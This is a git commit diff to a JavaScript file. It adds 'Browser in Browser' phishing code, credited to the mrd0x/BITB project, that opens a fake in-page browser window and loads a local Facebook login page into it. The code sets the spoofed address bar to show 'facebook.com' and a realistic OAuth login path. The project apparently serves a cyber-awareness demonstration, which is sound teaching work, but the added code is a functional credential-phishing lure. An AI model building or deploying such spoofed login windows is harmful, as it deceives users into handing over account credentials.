5e3fb08ab947588f4d655cdf5f054dd1e82144f4
Howard Luan <Howard.Luan@dal.ca>
2022-05-05 17:53:23 -0300

    Added Facebook login

--- script/script.js
+++ script/script.js
@@ -1,3 +1,12 @@
+$(document).ready(function(){
+    $('#start').modal({backdrop: 'static', keyboard: false})  
+	$("#start").modal('show');
+});
+
+/* Browser in Browser (BITB) Phishing Scripts. 
+ * Source: https://github.com/mrd0x/BITB
+ */
+
 var minimize = document.getElementById("minimize");
 var square = document.getElementById("square");
 var exit = document.getElementById("exit");
@@ -25,7 +34,7 @@ square.addEventListener('mouseout', function handleMouseOut() {
 });
 
 exit.addEventListener('mouseover', function handleMouseOver() {
-  exit.style.backgroundColor = '#E81123';
+  exit.style.backgroundColor = 'red';
   exit.style.cursor = 'context-menu';
 });
 
@@ -79,14 +88,23 @@ $("#square").click(enlarge);
 function enlarge(){
   if(square.classList.contains("enlarged")){
     $("#window").css("width", "40%");
-    $("#title-bar-width").css('width', '100%');
+    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
     $("#content").css("width", "100%");
     $("#square").removeClass("enlarged");
   }
   else{
     $("#window").css("width", "70%");
-    $("#title-bar-width").css('width', '100%');
+    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
     $("#content").css("width", "100%");
     $("#square").addClass("enlarged");
   }
 }
+
+
+//// Pop-up appear on click with delay ////
+$("#fb").click(function(){
+    $("#content").attr("src", 'fb/fb.html');
+    $("#domain-name").text("facebook.com");
+    $("#domain-path").text("/login.php?skip_api_login=1&api_key=85245248201208420422&kid_directed_site=0&app_id=784517845848524852&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fsso.cyeberawareness.com%252Fauth%252Fprovider%252Ffacebook%252Fsso%252Fcallback%26scope%3Demail%26client_id%4D8418048405448741418%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D25445011784-dvhuv-3452ad034-3guyf-f15e5bfd8%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fsso.cyeberawareness.com%2Fauth%2Fprovider%2Ffacebook%2Fsso%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=page&locale=en_US&pl_dbl=0")
+    $("#window").fadeIn(300);
+});
